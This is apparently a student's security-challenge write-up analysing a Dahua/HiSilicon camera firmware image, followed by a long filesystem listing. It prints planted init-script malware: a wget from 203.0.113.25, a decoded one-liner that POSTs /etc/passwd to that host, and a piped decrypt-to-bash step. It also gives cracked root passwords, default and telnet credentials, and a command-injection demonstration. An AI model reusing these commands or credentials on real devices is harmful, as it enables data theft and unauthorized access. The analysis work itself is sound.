# sampada-2025
# Firmware Analysis Progress Report

## **Introduction**
This report documents the steps undertaken in analyzing the firmware image `chakravyuh.bin` as part of a security challenge. The goal is to extract the firmware, explore its filesystem, and identify potential vulnerabilities.

---

## **Step 1: Initial Analysis with Binwalk**
The firmware image was initially analyzed using `binwalk`, a tool for inspecting and extracting embedded files and filesystems from binary images.

### **Command Used**:
    binwalk -e chakravyuh.bin
 

### **Findings**:
- The firmware contained a `uImage` Linux kernel header and a SquashFS filesystem.
- Extraction failed initially due to issues with the SquashFS filesystem.

---

## **Step 2: Extracting the Filesystem**
### **Corrupted SquashFS Filesystem**:
Attempts to manually extract the SquashFS filesystem using `unsquashfs` failed due to corruption. The following error was encountered:
lzma uncompress failed with error code 9
read_block: failed to read block @0x15142b5
read_fragment_table: failed to read fragment table index
FATAL ERROR: File system corruption detected.
 
As a result, the `squashfs-root` directory was empty after extraction.

### **Resolution with Sasquatch**:
To address this, `sasquatch`, a tool for extracting non-standard SquashFS filesystems, was installed and used.

#### **Steps Taken**:
1. Installed dependencies:
# 
    sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev
 
3. Cloned and built Sasquatch:
# 
    git clone https://github.com/devttys0/sasquatch
    cd sasquatch
    ./build.sh

 
3. Applied a patch to resolve build errors:
# 
    wget https://raw.githubusercontent.com/devttys0/sasquatch/82da12efe97a37ddcd33dba53933bc96db4d7c69/patches/patch0.txt
    mv patch0.txt patches/
    ./build.sh


### **Result**:
Successfully extracted the SquashFS filesystem from the firmware image.

---
Trying to extract IP Addresses - 
#
    grep -r -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' .

## **Step 3: Exploring the Extracted Filesystem**
After extraction, I navigated through the extracted filesystem to identify interesting files and directories.

### **Filesystem Structure**:
The root directory contained standard Linux directories such as `/bin`, `/etc`, `/lib`, `/usr`, along with specific directories like `/web`, `/Wireless`, and `/SigFileList`.

### **Key Findings in `/etc` Directory**:
1. **`passwd` File**:
#
    cat /etc/passwd
 
Output:
```root:$1$jSqQv.uP$jgz4lwEx2pnDh4QwXkh06/:0:0:root:/:/bin/sh```
 
- The root user password hash is stored in MD5 format (`$1$`), which is considered weak.
- This hash can potentially be cracked using tools like `John the Ripper`.



3. **No Shadow File**:
- The absence of an `/etc/shadow` file indicates that password hashes are stored directly in `passwd`, which is less secure.

---

## **Step 4: Identifying Camera Model**
Using the `file` command, I identified details about the camera model embedded in the firmware:

### **Command Used**:
    file chakravyuh.bin
```chakravyuh.bin: u-boot legacy uImage, hi3520Dromfs, Linux/ARM, OS Kernel Image (gzip), 13144064 bytes, Wed Nov 29 14:28:44 2017, Load Address: 0XA0060000, Entry Point: 0XA0DA0000, Header CRC: 0X71FF3C3D, Data CRC: 0X3F9F5075```

### **Findings**:
- The firmware references `hi3520Dromfs`, indicating it is based on HiSilicon's Hi3520D chip, commonly used in IP cameras.
- This suggests that the device might be an IP camera or similar hardware.

## **Step 5: Wireless Configuration**
The file `/etc/Wireless/RT2870STA/RT2870STA.dat` contains wireless configuration details. 

### **Contents of RT2870STA.dat**:
```
#The word of "Default" must not be removed
Default
CountryRegion=5
CountryRegionABand=7
CountryCode=
ChannelGeography=1
SSID=11n-AP
NetworkType=Infra
WirelessMode=5
Channel=0
BeaconPeriod=100
TxPower=100
BGProtection=0
TxPreamble=0
RTSThreshold=2347
FragThreshold=2346
TxBurst=1
PktAggregate=0
WmmCapable=1
AckPolicy=0;0;0;0
AuthMode=OPEN
EncrypType=NONE
WPAPSK=
DefaultKeyID=1
Key1Type=0
Key1Str=
Key2Type=0
Key2Str=
Key3Type=0
Key3Str=
Key4Type=0
Key4Str=
PSMode=CAM
AutoRoaming=0
RoamThreshold=70
APSDCapable=0
APSDAC=0;0;0;0
```
...
## Step 6- The real fun begins >:)
The path `etc/init.d/` has these bash scripts- 
#
    ls etc/init.d/
```S00devs  S01udev  S02wndev  S80network  S81toe  S99dh  rcS```

The rcS script executes all other scripts in `etc/init.d`
### **S02wndev**
The `S02wndev` script is interesting - 
```
#!/bin/bash

echo "service daemon packages..."

wget -O http://203.0.113.25/daemon

if [ $? -eq 0 ]; then
    echo "Download completed successfully."
else
    echo "Download failed."
fi

mv daemon /tmp/

echo "service daemon installed successfully"
```
This script attempts to download a file named daemon from an external IP address (203.0.113.25) and moves it to /tmp/.
<details>
<summary>Going to /tmp/ path</summary>
<br>
#
    
    $ cd tmp
    $ ls
        daemon  daemon1  daemon2  wireless
    $ cat daemon
        W1sgLWYgL2V0Yy9wYXNzd2QgXV0gJiYgd2dldCAtLW1ldGhvZD1QT1NUIC0taGVhZGVyPSJDb250ZW50LVR5cGU6IG11bHRpcGFydC9mb3JtLWRhdGEiIC0tYm9keS1maWxlPS9ldGMvcGFzc3dkICJodHRwOi8vMjAzLjAuMTEzLjI1LyI

The `daemon` seems like base64, so I decoded it and got this - 
#
    [[ -f /etc/passwd ]] && wget --method=POST --header="Content-Type: multipart/form-data" --body-file=/etc/passwd "http://203.0.113.25/"
</details>

### **S80network**
This script parses network configuration parameters from /proc/cmdline. It configures the network interface, enables Telnet (telnetd), and executes a hidden decryption script (/usr/sbin/.dec.sh) on the downloaded service daemon.
```
... More stuff up here
ifconfig lo 127.0.0.1
ifconfig eth0 up
telnetd

SERVICE_DAEMON="/tmp/daemon"
bash "$DEC" $SERVICE_DAEMON | bash
```

### S99dh
This script mounts multiple partitions, including JFFS2, CRAMFS, and RAMFS filesystems, and extracts sensitive files using p7zip. It also sets up PPPoE configuration files and starts network services like net3g.
```
mount -t jffs2 /dev/mtdblock5 /mnt/mtd -o sync
p7zip x /usr/lib/lib.7z /var/
p7zip x /usr/bin/Challenge.7z /var/
chmod -R 777 /var/*
dvrhelper /var/Challenge
```

### **Analysis**:
- The SSID is set to `11n-AP`.
- Authentication mode is set to `OPEN`, and encryption type is `NONE`.
- No WPA pre-shared key (`WPAPSK`) or WEP keys are configured.
- This lack of encryption indicates an insecure wireless setup, which could allow unauthorized access to the network.
---

## **Challenges Encountered**
1. **Corrupted SquashFS Filesystem**:
   - The manual extraction of the SquashFS filesystem using `unsquashfs` failed due to corruption, as indicated by errors during decompression.
   
2. **Resolution with Sasquatch**:
   - Successfully overcame this issue by using `sasquatch`, which is designed for non-standard or corrupted SquashFS filesystems.

---
# Vulnerabilities

## Exposed Credentials
Telnet credentials found in cleartext in `/usr/etc/telnet_cfg`
```
username=aditya
passwd=BXw6K8YB
```

## Exposed Private Key
```
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/data/ssl$ ls
ca.crt  ca.key  cacert.pem  privkey.pem  pubkey.pem
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/data/ssl$ cat privkey.pem
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFHzBJBgkqhkiG9w0BBQ0wPDAbBgkqhkiG9w0BBQwwDgQIc2H4GvZuEVMCAggA
MB0GCWCGSAFlAwQBKgQQ9Kw+XgzsGnGNAQPLfd7TdASCBNB9rOfOs8GwNUM++AJI
PZ02fzfI2KawLLjJNAddqpjwpfTzLxNSo8IBubYZJMFkOKzQmva6cwjxeaQ/f/2C
4MrTFiU0IKmTvWOSjLkSVt93e8fN4sbBf7n2c4lNC8NEUrWqE00d9EeW+WuyPqW1
9EukswWYafRNXLufDgx+O/2mWoO94bzqS0lyhLlVz02DJFSs403WuYlmzGSqiSWI
kL9CPdYa9fHfZX4fIF62HMFCbZKMGCmaXJutpi96jeDezbke1dIeg/c0YTt+vLRT
QDp2LKHhxrFdQA+VH9dWgGirlHjAcsLyRYmaiJjs3fAeXwRDzQejaGdVo4VNqPGQ
CJDqIAjCuaGTOCmw/Pr3vb0XGLEL4xFYeocJAoA/AidvyJgCIPvVdGDUolJv44w6
VNh85w1rfKQMW3fSrs7zS74WBAwP2Tk9iC+2nv29hKzVbqBApDgXsD+56i6FBtVx
fDKxUppcx2tcP3lDzEX7QNL7xY4rrAaBPZ28VMwKGG2X+bo0ruT1pkItuEqLCxBS
+si/cemicO9N/gEKF1c9BOx82IsuWBpYzhYYnAVy2rw9dcQF+SdspetwWCKkX2FD
zM0AaDLwrVFwK3lE2WqEkootGBbxbCpT3tPeYya4ybs4iFinMdbgITZnv7sJs9EU
02oKALfxbdHa3dFWGTUYmlG84GOfowvEWMM6WdJ6B16E/hYvW2hZIMf7+aT1w+5+
9RWFFgzqBl8K9D/aZdIn2h9ekNIxdIUYPO8DfRqwU4BP0lVI1q3wYwT6vuuR1GZ5
pR+sJnkw/h+a5ZUIqZkLJWxwmTOTZNEAimCR0yjjTeVm1qQ0nY2u++UYVEKk2HpU
NrDpgQ+l+Asecu6iA619WUQX+hDi4lIO2OHI1vN8xFuoWw9B3qr85ySHHkQAvaaq
bbqLxcGFZ1MK51qdlEBwjbFFOoj+tPx6SrqWIAJNfAcyFquAW3cMiRk+R9W00Vh1
1dYKwB8/VyiS94yLkUuDN55CaXH3i1ljEIrAoc6G8xTM2s5UUwESghMOLBT5Yozq
BI4pkgecsLNj9iRnLaM7RFxptjgrLVysp6iKtWn6r9ODFzf0wuF+Cwz709SUsuFi
iTFEdYNzBM4njQTuuI1XAa1WaWcfW0bdIIiHOP4ls1bwfAHQejt2YW1f4HYvsCyA
hDulztcUaC2J/aC2M6uO0t92fPsm3YmBRD087WNDGCex86XMm6FmEd287JaNffqj
poB7tbOk5kFulstIR09WjUBSOv4t4ufNIWSn1J9T5RYrGzhdD8gT1258OQhnALRH
R4hG+7a41LphN5lC+1P6BECIjwrcune2FqrGIChGMW7k3xvwJwsq3fd5N12hRv/y
sSj84mmfr1tImLfAphd4yOY2hgqUNIL+JwPIbfdbGHUx1PG2TzXD3qxyr55MPV13
U3IpXW8lSyjKonFgJwjZl8S5mxQQC3LYTiUT+uheR/4uqLQ1HYgSRkguFeBWVOX0
FctNLuu55vz/WiKVKMnrbhPT9JgjwZC2rsvQT4cJK2EWXuftMPA6u0G13yCkKZav
KDHq8D7VDl7l4iOR959tm8FFb7w+uuvFyWPpve5Wz1l0QVjfK2SWRZOzuNOxnti9
kFtUTg+C6T2n6aA+1PyAqZFGWg==
-----END ENCRYPTED PRIVATE KEY-----
```

Password reset key - 
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin/ssl$ cat pwdreset.pem
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA3RuR12tA3aFoIFJSekw1e9+Tc5JaJ3FczvFyQF4SmdK+XrHLnNlP
WCOrsok1neg7Tqbj09Y5AFmqxAhhHrPsZD+6lvBMr1QUHR+DsGQKxR10BuUOjn5B
z4g8PGjuFxYxE6UzKO8cYaUgcgVp9P1/kdnW/PZwNyJAwLwRpZUIOgs3636CH2UO
W3wMpjGu1nMB8PAQ4+v6dUC/jB5JoJrgEgRl94n5iwIJt+f38/ZXoL+DJOb6Q2UI
SjdjKtaRRxpeaSbFw/J7CZodcyTlNXOMx3n+ikUwtKw5iEdoRr9iq69WgqY0bd+O
9pWKE32swy6QXJaumiREjMQTHAtiB2y+qwIDAQAB
-----END RSA PUBLIC KEY-----

# 
    jay@5UD0-WH04M1:ü/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin$ qemu-arm -L $(realpath ../../) ./DahuaExec
    ./DahuaExec: cache '/etc/ld.so.cache' is corrupt
    DahuaExec usage : need 2 arguments, line : 81
    DahuaExec command is :


Leaks credentials
#
    /usr/data$ cat config.lua
```
...
 -- group
        INI_GROUP_NAME_ADMIN            = "admin";
        INI_GROUP_NAME_USER             = "user";
        -- user
        INI_SYS_USER_ADMIN              = "admin",
        INI_SYS_USER_ADMIN_PWD          = "admin",
        INI_SYS_USER_LOCAL              = "888888",
        INI_SYS_USER_LOCAL_PWD          = "888888",
        INI_USER_USER_LOCAL             = "666666",
        INI_USER_USER_LOCAL_PWD         = "666666",
        INI_DEFAULT_USER_NAME           = "default",
        INI_DEFAULT_USER_PWD            = "tluafed",
...
```
DahuaExec is vulnerable to Command Injection - 
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin$ qemu-arm -L $(realpath ../../) ./Dahua
    Exec /bin/ls /tmp
    ./DahuaExec: cache '/etc/ld.so.cache' is corrupt
    DahuaExec command is : ./DahuaExec /bin/ls /tmp
    1test  Challenge  DahuaExec  lua  secboot  ssl
jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin$ qemu-arm -L $(realpath ../../) ./DahuaExec /bin/pwd /tmp
    ./DahuaExec: cache '/etc/ld.so.cache' is corrupt
    DahuaExec command is : ./DahuaExec /bin/pwd /tmp
    /home/jay/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/usr/bin


## /etc/passwd & /etc/passwd-
1. **Backup Password File (`passwd-`)**:
#
    cat /etc/passwd-
 
Output:
```root:ab8nBoH3mb8.g:0:0::/root:/bin/sh```
 
- This file contains another hash format for the root password.
- The type is DES and it has been CRACKED! THE PASSWORD IS - `helpme`
- It had the salt `ab`

  Python Script to verify -
  #
        import crypt

        password = "helpme"
        salt = "ab"
        
        des_hash = crypt.crypt(password, salt)
        
        print("DES Hash:", des_hash)

    Output of python program - `DES Hash: ab8nBoH3mb8.g`
    - ✅ Matches with the hash we found earlier. 

2. **Main Password File (`passwd`)**
# 
    cat /etc/passwd

Output: 
```root:$1$jSqQv.uP$jgz4lwEx2pnDh4QwXkh06/:0:0:root:/:/bin/sh```

- This file contains an MD5 hash with salt `$1$jSqQv.uP`
- It has been CRACKED! THE PASSWORD IS - `vizxv`

  Python script to verify -
  #
        import crypt
        
        password = "vizxv"
        salt = "$1$jSqQv.uP"
        
        des_hash = crypt.crypt(password, salt)
        
        print("MD5  Hash:", des_hash)

  
  Output of python program - `MD5  Hash: $1$jSqQv.uP$jgz4lwEx2pnDh4QwXkh06/`
  - ✅ Matches with the hash we found earlier. 

## Other interesting folders
#
     cd usr/data  
#
    cd etc/Wireless/RT2870STA/
    cat RT2870STA.dat
# 
    cat etc/services
    

# 
    cd usr/lib/lib.7z.extracted/0/lib
    ls

# 
    cd web/config/
    cat index.htm | less

- Stores username and password in base64 based on - `g_basePassword = Base64.encode(username + ':' + password);` 
- Allows weak passwords - `var g_supportWeakPassword = true;//是否允许添加弱密码，默认是支持的`
- IP - 
```
function loginOCX(usr, pwd, type, logintype)
{
        var ret = 0;
        //var ip = '172.8.1.176';
        var ip = location.hostname;
        var username = usr;
        var password = pwd;
        var tcpPort = capTcpPort;
        g_netType = type;
        g_ocx.SetModuleMode(g_netType==0?1:10);
        ret = g_ocx.LoginDeviceEx(ip, tcpPort, username, password, logintype);

        if (ret == 0)
        {
                g_LoginId = g_ocx.GetLoginID();
        }
        return ret;
}
```
- An old comment - `//兼容明文username=admin&password=admin`

# 
    cd usr/etc/
    cat Global.lua
    

## Analyzing the Challenge file

# 
    strings Challenge | grep "Don't"
# 
    strings Challenge | grep "decrypt"
# 
    strings Challenge | grep "passwd"
# 
    strings Challenge | grep "pass"
# Algorithms
# 
    jay@5UD0-WH04M1:~/sampada_hackathon/_chakravyuh.bin-1.extracted/squashfs-root/web/jsCore$ ls
    aes.js  common.js  rpcCore.js  rsa.js


# Important
   write impact in slides, and include direct access to web directory as a vulnerability
## **Next Steps**
Important - todo:
#
    Automation of assessment
    Network wide capability
    Linux hardening standard operating procedures
    look up the sops and get "inspiration" (CTRL C + CTRL V) for slides
1. Attempt password cracking for hashes found in `/etc/passwd` and `/etc/passwd-`.
2. Analyze startup scripts in `/etc/init.d/` for potential vulnerabilities.
3. Search for SUID/SGID binaries that could allow privilege escalation:
# 
    find / -perm /4000 2>/dev/null

    
---

## **Conclusion**
The analysis so far has successfully extracted the firmware's filesystem and identified areas of interest, such as weak password storage mechanisms and potential hardware details (HiSilicon Hi3520D). Further exploration will focus on uncovering vulnerabilities within the system.


- .
  - bin
    - Data_Signature
    - SigFileList
    - [
    - [[
    - ash
    - awk
    - bash
    - bootenv
    - busybox
    - cat
    - chat
    - chmod
    - cp
    - cttyhack
    - dd
    - devmem
    - df
    - dnsdomainname
    - du
    - echo
    - eject
    - free
    - grep
    - gunzip
    - gzip
    - hostname
    - hush
    - ifenslave
    - ip
    - ipaddr
    - iplink
    - iproute
    - iprule
    - iptunnel
    - kill
    - killall
    - killall5
    - less
    - login
    - ls
    - mesg
    - mkdir
    - mknod
    - mktemp
    - mount
    - msh
    - mv
    - netstat
    - nice
    - p7zip
    - passwd
    - ping
    - ping6
    - printenv
    - ps
    - pwd
    - rm
    - sh
    - sleep
    - sync
    - tar
    - top
    - touch
    - umount
    - uname
    - vi
    - vlock
    - wget
    - whoami
  - boot
    - uImage
    - uImage.extracted
      - 0
        - Linux-3.10.0.bin
        - Linux-3.10.0.bin.extracted
          - 1F58
            - decompressed.bin
            - decompressed.bin.extracted
              - 52C6A0
                - dev
                  - console
                - root
  - dev
    - dh_resource
    - null
    - pts
    - ttyAMA3
    - ttyS000
  - etc
    - Data_Signature
    - SigFileList
    - SigFilePartition
    - Wireless
      - RT2870STA
        - RT2870STA.dat
    - crackthis
    - crackthis.txt
    - fs-version
    - fstab
    - group
    - init.d
      - S00devs
      - S01udev
      - S02wndev
      - S80network
      - S81toe
      - S99dh
      - rcS
    - inittab
    - mactab
    - memstat.conf
    - mtab
    - new.py
    - passwd
    - passwd-
    - ppp
    - profile
    - protocols
    - services
    - test.py
    - udev
      - rules.d
        - 54-gphoto.rules
        - 60-pcmcia.rules
        - 75-cd-aliases-generator.rules.optional
        - 75-persistent-net-generator.rules.optional
        - 90-hal.rules
        - 97-bluetooth-serial.rules
        - 99-fuse.rules
        - device-mapper.rules
      - udev.conf
    - word.txt
  - home
  - init
  - lib
    - Data_Signature
    - SigFileList
    - ld-uClibc-0.9.33.2.so
    - ld-uClibc.so.0
    - libacl.so.1
    - libattr.so.1
    - libblkid.so.1
    - libc.so.0
    - libc.so.6
    - libcrypt-0.9.33.2.so
    - libcrypt.so.0
    - libcrypto.so.3
    - libdl-0.9.33.2.so
    - libdl.so.0
    - libgcc_s.so.1
    - libhive_RES.so
    - libhive_common.so
    - libidn2.so.0
    - liblzma.so.5
    - libm-0.9.33.2.so
    - libm.so.0
    - libmount.so.1
    - libpcre2-8.so.0
    - libpsl.so.5
    - libpthread-0.9.33.2.so
    - libpthread.so.0
    - librt-0.9.33.2.so
    - librt.so.0
    - libselinux.so.1
    - libssl.so.3
    - libstdc++.so.6
    - libthread_db-0.9.33.2.so
    - libthread_db.so.1
    - libtinfo.so.6
    - libuClibc-0.9.33.2.so
    - libunistring.so.2
    - libutil-0.9.33.2.so
    - libutil.so.0
    - libuuid.so.1
    - libz.so.1
    - libzstd.so.1
    - x86_64-linux-gnu
      - libc.so.6
      - libffi.so.8
      - libgcc_s.so.1
      - libglib-2.0.so.0
      - libgmodule-2.0.so.0
      - libgmp.so.10
      - libgnutls.so.30
      - libhogweed.so.6
      - libidn2.so.0
      - libm.so.6
      - libnettle.so.8
      - libp11-kit.so.0
      - libpcre.so.3
      - libpcre2-8.so.0
      - libselinux.so.1
      - libstdc++.so.6
      - libtasn1.so.6
      - libtinfo.so.6
      - libunistring.so.2
      - liburing.so.2
      - libz.so.1
  - lib64
    - ld-linux-x86-64.so.2
  - linuxrc
  - mnt
    - custom
    - dvs
    - logo
    - mtd
      - Config
        - eracfg-finish
        - ppp
          - options
          - pap-secrets
          - pppoe-enable
          - pppoe-redial_time
          - pppoe-start
          - pppoesessionctx
      - Log
      - backtrace.out
      - ppp
    - nfs
    - web
  - nfs
  - proc
    - dahua
  - root
  - sbin
    - 3gpp
    - Data_Signature
    - SigFileList
    - chat
    - depmod
    - dvrhelper
    - fdisk
    - getty
    - halt
    - hdparm
    - ifconfig
    - ifdown
    - ifup
    - inetd
    - init
    - insmod
    - lsmod
    - lspci
    - lsusb
    - makedevs
    - mdev
    - modprobe
    - net3g
    - netinit
    - netinit6
    - poweroff
    - pppd
    - pppoe
    - pppoe-start
    - reboot
    - rmmod
    - route
    - snmpd
    - upgraded
    - upnp_tv_ctrlpt
  - share
  - slave
  - sys
  - tmp
    - daemon
    - daemon1
    - daemon2
    - test
    - wireless
      - 1
      - 108
      - 81
      - 99
  - treecmd.txt
  - usr
    - Data_Signature
    - SigFileList
    - bin
      - Challenge
      - DahuaExec
      - bash
      - chmod
      - cp
      - ifconfig
      - insmod
      - lua
        - ATMCtrl.lua
        - ATMHead.lua
        - LiveUpdate.lua
        - PTZCtrl.lua
        - com
          - ParseKLPOSStr.lua
        - compat-5.1.lua
        - init.lua
        - ptz
          - AD1641M.lua
          - ADMatrix.lua
          - Banknote.lua
          - CATU.lua
          - CP-CVI.lua
          - CP-CVI2.0.lua
          - DH-CC440.lua
          - DH-MATRIX.lua
          - DH-SD1.lua
          - DH-SD2.lua
          - EPTZ.lua
          - General.lua
          - HAIYU.lua
          - HY.lua
          - LG.lua
          - LiLin.lua
          - Mercer-1.lua
          - Mercer.lua
          - PANASONIC.lua
          - PELCOD-MING.lua
          - PELCOD-S.lua
          - PELCOD-S1.lua
          - PHILIPS.lua
          - PIH-717.lua
          - Pe5051k.lua
          - Pelco-9750.lua
          - PelcoASCII.lua
          - PelcoD-DON.lua
          - PelcoD.lua
          - PelcoD1.lua
          - PelcoD1_Tour.lua
          - PelcoD_Tour.lua
          - PelcoP-A.lua
          - PelcoP-HK.lua
          - PelcoP-SD.lua
          - PelcoP.lua
          - PelcoP1-A.lua
          - PelcoP1.lua
          - PelcoP5.lua
          - QT-2XXD.lua
          - RM110.lua
          - SAE.lua
          - SANLI.lua
          - SANTACHI.lua
          - SHARP.lua
          - SIERA-D.lua
          - SIERA-P.lua
          - SONY.lua
          - SUNKWANG.lua
          - Samsung.lua
          - Videon-X.lua
          - Videon_D.lua
          - Videon_P.lua
          - WV-CS850I.lua
          - WV-CS850II.lua
          - WV-CS950.lua
          - Yaan.lua
        - utils.lua
      - mkdir
      - mknod
      - mount
      - p7zip
      - qemu-arm
      - qemu-arm-static
      - realpath
      - rm
      - secboot
        - public.pem
      - ssl
        - pwdreset.pem
      - test.html
      - test.py
      - test.xml
      - touch
      - wget
    - data
      - CustomConfig
      - Data
        - DeviceSecurity
          - PatternNormal.png
          - PatternSelect.png
          - device_init_step1.png
          - device_init_step1_finish.png
          - device_init_step2.png
          - device_init_step2_finish.png
          - device_init_step3.png
          - device_init_step3_finish.png
          - headPic.png
          - progress0.png
          - progress1.png
          - progress2.png
          - progress3.png
          - progress4.png
          - progress5.png
          - progress6.png
          - progress7.png
          - progress8.png
          - progress9.png
        - Font.bin
        - FontSmallEn.bin
        - Intell
          - CrossLineDetection.png
          - CrossRegionDetection.png
          - LeftDetection.png
          - TakenAwayDetection.png
          - bmp_intellback.png
          - button_set_disable.bmp
          - button_set_normal.bmp
          - button_set_push.bmp
          - checkbox_intelli_0_disable.bmp
          - checkbox_intelli_0_normal.bmp
          - checkbox_intelli_1_disable.bmp
          - checkbox_intelli_1_normal.bmp
          - checkbox_intelli_disable.png
          - checkbox_intelli_disableselect.png
          - checkbox_intelli_enable.png
          - checkbox_intelli_enableselect.png
          - delete_normal.bmp
          - delete_select.bmp
          - filteredit_normal.bmp
          - filteredit_select.bmp
        - NavigationBar
          - Separator.png
          - alert_normal.png
          - alert_select.png
          - channel_info_normal.png
          - channel_info_select.png
          - channel_tree_normal.png
          - channel_tree_select.png
          - collect_normal.png
          - collect_select.png
          - colorSet_normal.png
          - colorSet_select.png
          - disk_error.png
          - disk_error_select.png
          - disk_normal.png
          - disk_notexist.png
          - disk_notexist_select.png
          - disk_select.png
          - home_normal.png
          - home_select.png
          - left_normal.png
          - left_select.png
          - menu_exp.png
          - net_abort.png
          - net_abort_select.png
          - net_arp.png
          - net_arp_select.png
          - network_connected_normal.png
          - network_connected_select.png
          - next_screen_normal.png
          - next_screen_select.png
          - playback_normal.png
          - playback_select.png
          - prev_screen_normal.png
          - prev_screen_select.png
          - ptz_normal.png
          - ptz_select.png
          - remote_normal.png
          - remote_select.png
          - right_normal.png
          - right_select.png
          - tour_disable_normal.png
          - tour_disable_select.png
          - tour_enable_normal.png
          - tour_enable_select.png
          - usb_normal.png
          - usb_select.png
          - windows16_normal.png
          - windows16_select.png
          - windows1_normal.png
          - windows1_select.png
          - windows25_normal.png
          - windows25_select.png
          - windows32_normal.png
          - windows32_select.png
          - windows4_normal.png
          - windows4_select.png
          - windows6_normal.png
          - windows6_select.png
          - windows8_normal.png
          - windows8_select.png
          - windows9_normal.png
          - windows9_select.png
        - RealPlay
          - audio_close_normal.png
          - audio_close_selected.png
          - audio_disable.png
          - audio_open_normal.png
          - audio_open_selected.png
          - audiotalk_disable.png
          - audiotalk_normal.png
          - audiotalk_push.png
          - audiotalk_selected.png
          - block_disable.png
          - block_normal.png
          - block_selected.png
          - close_normal.png
          - close_selected.png
          - disable.png
          - hover.png
          - manual_snap_disable.png
          - manual_snap_normal.png
          - manual_snap_on_normal.png
          - manual_snap_on_select.png
          - manual_snap_selected.png
          - menuplay_backcolor.png
          - netcameraedit_disable.png
          - netcameraedit_normal.png
          - netcameraedit_selected.png
          - normal.png
          - pause_normal.png
          - pause_selected.png
          - play_normal.png
          - play_selected.png
          - play_slider_background.png
          - play_slider_elapsed.png
          - realbk_disable.png
          - realbk_normal.png
          - realbk_on_normal.png
          - realbk_on_selected.png
          - realbk_selected.png
          - realplay_normal.png
          - realplay_selected.png
          - zoomin_normal.png
          - zoomin_on_normal.png
          - zoomin_on_selected.png
          - zoomin_selected.png
        - StringAll.7z
        - StringAll.7z.extracted
          - 0
            - StringAll
        - afterSaleService
          - DahuaTechnology.png
          - after_sale_service.png
          - after_sale_service1.png
          - after_sale_service2.png
        - colorSettingPage
          - Brightness.png
          - Contrast.png
          - EqLevel.png
          - Gamma.png
          - Hue.png
          - Saturation.png
          - VideoPosition.png
          - colorSet_normal.png
          - plus0.png
          - plus1.png
          - plus2.png
          - plus3.png
          - reset0.png
          - reset1.png
          - reset2.png
          - reset3.png
          - subtractive0.png
          - subtractive1.png
          - subtractive2.png
          - subtractive3.png
          - unlock_disable.png
          - unlock_normal.png
          - unlock_select.png
        - ctrl
          - button
            - button_disable.bmp
            - button_normal.bmp
            - button_push.bmp
            - button_select.bmp
        - cursors
          - arrow.cur
          - busy.cur
          - hand.cur
          - move.cur
          - size1.cur
          - size2.cur
          - size3.cur
          - size4.cur
          - wait.cur
          - zoomin.cur
        - desktopPage
          - 3G_pppon.bmp
          - 4G_pppon.bmp
          - channel_state_lock.bmp
          - channel_state_mtd.bmp
          - channel_state_vls.bmp
          - tour_disable.bmp
          - tour_enable.bmp
          - wifi_enable.bmp
        - exitPage
          - logout1.png
          - logout2.png
          - reboot1.png
          - reboot2.png
          - shutdown
